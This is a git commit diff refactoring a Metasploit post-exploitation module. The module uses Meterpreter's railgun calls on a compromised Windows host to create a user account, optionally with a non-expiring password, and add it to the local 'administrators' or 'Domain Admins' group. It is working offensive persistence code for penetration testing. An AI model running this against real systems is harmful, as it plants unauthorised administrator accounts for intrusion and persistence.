e2e6c15c31c37189901d9c30a994b1bdc3cdca10
cn-kali-team <kali-team@qq.com>
2020-03-01 14:25:03 +0800

    Remove alloc_and_write_str Function, Move structure to accounts.rb file

--- modules/post/windows/manage/add_user_with_api.rb
+++ modules/post/windows/manage/add_user_with_api.rb
@@ -44,29 +44,6 @@ class MetasploitModule < Msf::Post
       ])
   end
 
-  #
-  # InitializeUnicodeStr(&uStr,L"string");
-  #
-  def alloc_and_write_str(value)
-    if value == nil
-    return 0
-    else
-    data = client.railgun.util.str_to_uni_z(value)
-    result = client.railgun.kernel32.VirtualAlloc(nil, data.length, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)
-    if result['return'].nil?
-      print_error "Failed to allocate memory on the host."
-      return nil
-    end
-    addr = result['return']
-    if client.railgun.memwrite(addr, data, data.length)
-      return addr
-    else
-      print_error "Failed to write to memory on the host."
-      return nil
-    end
-    end
-  end
-
   def check_result(user_result)
     case user_result['return']
     when client.railgun.const('ERROR_ACCESS_DENIED')
@@ -107,163 +84,100 @@ class MetasploitModule < Msf::Post
     end
   end
 
-def local_mode()
-  if datastore['GROUP'] == nil
-    datastore['GROUP'] = 'administrators'
-    print_status("You have not set up a group. The default is '#{datastore['GROUP']}' " )
+  def local_mode()
+    if datastore['GROUP'] == nil
+      datastore['GROUP'] = 'administrators'
+      print_status("You have not set up a group. The default is '#{datastore['GROUP']}' " )
+    end
+    if datastore['SERVER_NAME'] != nil and datastore['SERVER_NAME'][0,2] != '\\\\'
+      print_error("Wrong format of service name, e.g. \\\\XXX.kali-team.cn,(Escape sequences:\\\\\\\\ => \\\\)")
+      return nil
+    end
+    dont_expire_pwd = datastore['DONT_EXPIRE_PWD']
+    acct_flags = 'UF_SCRIPT | UF_NORMAL_ACCOUNT'
+    if dont_expire_pwd
+      acct_flags << ' | UF_DONT_EXPIRE_PASSWD'
+    end
+    #  Add user
+    result = add_user(datastore['SERVER_NAME'], datastore['USERNAME'], datastore['PASSWORD'], acct_flags)
+    if result['return'] == 0
+      print_good("User '#{datastore['USERNAME']}' was added!")
+    else
+      check_result(result)
+    end
+    #  Add localgroup if it not exists
+    result = add_localgroup(datastore['SERVER_NAME'], datastore['GROUP'])
+    if result['return'] == 0
+      print_good("Group '#{datastore['GROUP']}'  was added!")
+    else
+      check_result(result)
+    end
+    #  Add Member to LocalGroup
+    result = add_members_localgroup(datastore['SERVER_NAME'], datastore['GROUP'], datastore['USERNAME'])
+    if result['return'] == 0
+      print_good("'#{datastore['USERNAME']}' is now a member of the '#{datastore['GROUP']}' group!")
+    else
+      check_result(result)
+    end
   end
-  if datastore['SERVER_NAME'] != nil and datastore['SERVER_NAME'][0,2] != '\\\\'
-    print_error("Wrong format of service name, e.g. \\\\XXX.kali-team.cn,(Escape sequences:\\\\\\\\ => \\\\)")
-    return nil
-  end
-  addr_username    = alloc_and_write_str(datastore['USERNAME'])
-  addr_password     = alloc_and_write_str(datastore['PASSWORD'])
-  addr_group   = alloc_and_write_str(datastore['GROUP'])
-  dont_expire_pwd = datastore['DONT_EXPIRE_PWD']
-  if addr_username.nil? || addr_password.nil?
-    return nil
-  end
-  acct_flags = 'UF_SCRIPT | UF_NORMAL_ACCOUNT'
-  if dont_expire_pwd
-    acct_flags << ' | UF_DONT_EXPIRE_PASSWD'
-  end
-  #  Set up the USER_INFO_1 structure.
-  #  https://docs.microsoft.com/en-us/windows/win32/api/Lmaccess/ns-lmaccess-user_info_1
-  user_info = [
-    addr_username,
-    addr_password,
-    0x0,
-    0x1,
-    0x0,
-    0x0,
-    client.railgun.const(acct_flags),
-    0x0
-  ].pack("VVVVVVVV")
-  #  Add user
-  result = add_user(datastore['SERVER_NAME'], user_info)
-  if result['return'] == 0
-    print_good("User '#{datastore['USERNAME']}' was added!")
-  else
-    check_result(result)
-  end
-  #  Add localgroup if it not exists
-  #  Set up the #  LOCALGROUP_INFO_1 structure.
-  localgroup_info = [
-    addr_group, #  lgrpi1_name
-    0x0 #  lgrpi1_comment
-  ].pack("VV")
-  result = add_localgroup(datastore['SERVER_NAME'], localgroup_info)
-  if result['return'] == 0
-    print_good("Group '#{datastore['GROUP']}'  was added!")
-  else
-    check_result(result)
-  end
-  #  Add Member to LocalGroup
-  #  Set up the LOCALGROUP_MEMBERS_INFO_3 structure.
-  localgroup_members = [
-    addr_username, #  lgrmi3_domainandname
-  ].pack("V")
-  result = add_members_localgroup(datastore['SERVER_NAME'], datastore['GROUP'], localgroup_members)
-  if result['return'] == 0
-    print_good("'#{datastore['USERNAME']}' is now a member of the '#{datastore['GROUP']}' group!")
-  else
-    check_result(result)
-  end
-  # free memory
-  client.railgun.multi([
-    ["kernel32", "VirtualFree", [addr_username, 0, MEM_RELEASE]], #  addr_username
-    ["kernel32", "VirtualFree", [addr_password, 0, MEM_RELEASE]],  #  addr_password
-    ["kernel32", "VirtualFree", [addr_group, 0, MEM_RELEASE]], #  addr_group
-  ])
-end
 
-def domain_mode()
-  ## enum domain
-  domain = get_domain(nil, 'DomainControllerName')
-  if domain
-    # primary_domain = domain.split('.')[0].upcase.to_s
-    print_good("Found Domain : #{domain}")
-  else
-    print_error("Oh, Domain server not found.")
-    return false
+  def domain_mode()
+    ## enum domain
+    domain = get_domain(nil, 'DomainControllerName')
+    if domain
+      # primary_domain = domain.split('.')[0].upcase.to_s
+      print_good("Found Domain : #{domain}")
+    else
+      print_error("Oh, Domain server not found.")
+      return false
+    end
+    if datastore['GROUP'] == nil
+      datastore['GROUP'] = 'Domain Admins'
+      print_status("You have not set up a group. The default is '#{datastore['GROUP']}' " )
+    end
+    if datastore['SERVER_NAME'] == nil
+      datastore['SERVER_NAME'] = domain
+      print_status("You have not set up a server_name. The default is '#{datastore['SERVER_NAME']}' " )
+    end
+    if datastore['SERVER_NAME'] != nil and datastore['SERVER_NAME'][0,2] != '\\\\'
+      print_error("Wrong format of service name, e.g. \\\\XXX.kali-team.cn,(Escape sequences:\\\\\\\\ => \\\\)")
+      return nil
+    end
+    domain_admins = get_members_from_group(datastore['SERVER_NAME'], datastore['GROUP'])
+    if domain_admins
+      print_good("Domain Group Members:"<<domain_admins.to_s)
+    end
+    dont_expire_pwd = datastore['DONT_EXPIRE_PWD']
+    acct_flags = 'UF_SCRIPT | UF_NORMAL_ACCOUNT'
+    if dont_expire_pwd
+      acct_flags << ' | UF_DONT_EXPIRE_PASSWD'
+    end
+    #  Add user
+    result = add_user(datastore['SERVER_NAME'],datastore['USERNAME'], datastore['PASSWORD'], acct_flags)
+    if result['return'] == 0
+      print_good("User '#{datastore['USERNAME']}' was added!")
+    else
+      check_result(result)
+    end
+    #  Add localgroup if it not exists
+    result = add_group(datastore['SERVER_NAME'], datastore['GROUP'])
+    if result['return'] == 0
+      print_good("Group '#{datastore['GROUP']}'  was added!")
+    else
+      check_result(result)
+    end
+    # Add member to domain group
+    result = add_members_group(datastore['SERVER_NAME'], datastore['GROUP'], datastore['USERNAME'])
+    if result['return'] == 0
+      print_good("'#{datastore['USERNAME']}' is now a member of the '#{datastore['GROUP']}' group!")
+    else
+      check_result(result)
+    end
+    domain_admins = get_members_from_group(datastore['SERVER_NAME'], datastore['GROUP'])
+    if domain_admins
+      print_good("Now,Domain Group Members:"<<domain_admins.to_s)
+    end
   end
-  if datastore['GROUP'] == nil
-    datastore['GROUP'] = 'Domain Admins'
-    print_status("You have not set up a group. The default is '#{datastore['GROUP']}' " )
-  end
-  if datastore['SERVER_NAME'] == nil
-    datastore['SERVER_NAME'] = domain
-    print_status("You have not set up a server_name. The default is '#{datastore['SERVER_NAME']}' " )
-  end
-  if datastore['SERVER_NAME'] != nil and datastore['SERVER_NAME'][0,2] != '\\\\'
-    print_error("Wrong format of service name, e.g. \\\\XXX.kali-team.cn,(Escape sequences:\\\\\\\\ => \\\\)")
-    return nil
-  end
-  addr_username    = alloc_and_write_str(datastore['USERNAME'])
-  addr_password     = alloc_and_write_str(datastore['PASSWORD'])
-  addr_group   = alloc_and_write_str(datastore['GROUP'])
-  domain_admins = get_members_from_group(datastore['SERVER_NAME'], datastore['GROUP'])
-  if domain_admins
-    print_good("Domain Group Members:"<<domain_admins.to_s)
-  end
-  dont_expire_pwd = datastore['DONT_EXPIRE_PWD']
-  if addr_username.nil? || addr_password.nil?
-    return nil
-  end
-  acct_flags = 'UF_SCRIPT | UF_NORMAL_ACCOUNT'
-  if dont_expire_pwd
-    acct_flags << ' | UF_DONT_EXPIRE_PASSWD'
-  end
-  #  Set up the USER_INFO_1 structure.
-  #  https://docs.microsoft.com/en-us/windows/win32/api/Lmaccess/ns-lmaccess-user_info_1
-  user_info = [
-    addr_username,
-    addr_password,
-    0x0,
-    0x1,
-    0x0,
-    0x0,
-    client.railgun.const(acct_flags),
-    0x0
-  ].pack("VVVVVVVV")
-  #  Add user
-  result = add_user(datastore['SERVER_NAME'], user_info)
-  if result['return'] == 0
-    print_good("User '#{datastore['USERNAME']}' was added!")
-  else
-    check_result(result)
-  end
-  #  https://docs.microsoft.com/zh-cn/windows/win32/api/lmaccess/ns-lmaccess-group_info_1
-  # Set up the GROUP_INFO_1 structure.
-  group_info_1 = [
-    addr_group,
-    0x0
-  ].pack("VV")
-  #  Add localgroup if it not exists
-  result = add_group(datastore['SERVER_NAME'], group_info_1)
-  if result['return'] == 0
-    print_good("Group '#{datastore['GROUP']}'  was added!")
-  else
-    check_result(result)
-  end
-  # Add member to domain group
-  result = add_members_group(datastore['SERVER_NAME'], datastore['GROUP'], datastore['USERNAME'])
-  if result['return'] == 0
-    print_good("'#{datastore['USERNAME']}' is now a member of the '#{datastore['GROUP']}' group!")
-  else
-    check_result(result)
-  end
-  domain_admins = get_members_from_group(datastore['SERVER_NAME'], datastore['GROUP'])
-  if domain_admins
-    print_good("Now,Domain Group Members:"<<domain_admins.to_s)
-  end
-  # free memory
-  client.railgun.multi([
-    ["kernel32", "VirtualFree", [addr_username, 0, MEM_RELEASE]], #  addr_username
-    ["kernel32", "VirtualFree", [addr_password, 0, MEM_RELEASE]],  #  addr_password
-    ["kernel32", "VirtualFree", [addr_group, 0, MEM_RELEASE]],          #  addr_group
-  ])
-end
 
   def run
     print_status("Running module on '#{sysinfo['Computer']}'")
